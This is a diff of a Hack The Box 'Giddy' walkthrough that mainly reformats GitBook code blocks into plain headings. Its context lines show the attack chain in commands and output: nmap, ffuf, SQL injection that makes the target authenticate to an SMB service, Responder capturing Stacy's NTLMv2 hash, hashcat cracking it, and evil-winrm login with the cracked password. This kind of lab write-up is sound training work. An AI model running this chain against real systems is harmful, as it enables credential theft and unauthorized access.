@@ -2,7 +2,8 @@
 
 ## Foothold
 
-{% code title="Nmap Results" %}
+Nmap Results
+
 ```
 ┌──[Sat Nov  5 08:42:55 PM CDT 2022]-[wlan0:192.168.1.153 tun0:10.10.16.2]-[TheScriptKid]-[/home/pentester/Downloads]
 └──# rscan $ip       
@@ -26,11 +27,12 @@ PORT     STATE SERVICE       REASON          VERSION
 5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
 
 ```
-{% endcode %}
 
 <figure><img src=".gitbook/assets/image (6).png" alt=""><figcaption><p>Landing Page. Nothing of Interest.</p></figcaption></figure>
 
-<pre data-title="Web Directory Bruteforcing"><code>┌──[Sat Nov  5 08:53:37 PM CDT 2022]-[wlan0:192.168.1.153 tun0:10.10.16.2]-[TheScriptKid]-[/home/pentester/Downloads]
+Web Directory Bruteforcing
+
+<pre><code>┌──[Sat Nov  5 08:53:37 PM CDT 2022]-[wlan0:192.168.1.153 tun0:10.10.16.2]-[TheScriptKid]-[/home/pentester/Downloads]
 └──# ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -u http://$ip/FUZZ/ -fc 404
 
         /'___\  /'___\           /'___\       
@@ -63,9 +65,10 @@ ________________________________________________
 
 <figure><img src=".gitbook/assets/image (5).png" alt=""><figcaption><p>Confirmed SQL Injection</p></figcaption></figure>
 
-<figure><img src=".gitbook/assets/image (3).png" alt=""><figcaption><p>Redoing The Injection Using Burp Suite Using A Different Payload To Authenticate To A Malicious SMB Service </p></figcaption></figure>
+<figure><img src=".gitbook/assets/image (3).png" alt=""><figcaption><p>Performing The Injection Using Burp Suite With A Different Payload To Authenticate To A Malicious SMB Service </p></figcaption></figure>
 
-{% code title="Setting Up Responder To Capture NTLMv2 Hash" %}
+Setting Up Responder To Capture NTLMv2 Hash
+
 ```
 ┌──[Sat Nov  5 09:38:21 PM CDT 2022]-[wlan0:192.168.1.153 tun0:10.10.16.2]-[TheScriptKid]-[/home/pentester/Documents/PenetrationTesting/hackthebox/giddy]
 └──# /opt/Responder-3.1.3.0/Responder.py -I tun0
@@ -88,9 +91,10 @@ ________________________________________________
     SMB server                 [ON]
 [+] Listening for events...
 ```
-{% endcode %}
 
-{% code title="After Forwarding The Request We Receive The NTLMv2 Hash" overflow="wrap" %}
+After Forwarding The Request We Receive The NTLMv2 Hash
+
+{% code overflow="wrap" %}
 ```
 [SMB] NTLMv2-SSP Client   : 10.129.96.140
 [SMB] NTLMv2-SSP Username : GIDDY\Stacy
@@ -98,7 +102,9 @@ ________________________________________________
 ```
 {% endcode %}
 
-{% code title="Cracking The Hash After Saving It To File" overflow="wrap" %}
+Cracking The Hash After Saving It To File
+
+{% code overflow="wrap" %}
 ```
 ┌──[Sat Nov  5 09:44:50 PM CDT 2022]-[wlan0:192.168.1.153 tun0:10.10.16.2]-[TheScriptKid]-[/home/pentester/Documents/PenetrationTesting/hackthebox/giddy]
 └──# hashcat -d 2 hash.txt -m 5600 --wordlist /usr/share/wordlists/rockyou.txt    
@@ -108,7 +114,8 @@ STACY::GIDDY:be355fe1b12011d2:ba1899e1beacf1657261e50ed8e6577b:01010000000000008
 ```
 {% endcode %}
 
-{% code title="Gaining Initial Foothold Through WinRM Using The Credentials" %}
+Gaining Initial Foothold Through WinRM Using The Credentials
+
 ```
 ┌──[Sat Nov  5 09:45:29 PM CDT 2022]-[wlan0:192.168.1.153 tun0:10.10.16.2]-[TheScriptKid]-[/home/pentester/Documents/PenetrationTesting/hackthebox/giddy]
 └──# evil-winrm -i $ip -u stacy -p xNnWo6272k7x                                                                                                            1 ⨯
@@ -123,7 +130,6 @@ Info: Establishing connection to remote endpoint
 
 *Evil-WinRM* PS C:\Users\Stacy\Documents>
 ```
-{% endcode %}
 
 ## User Proof
 
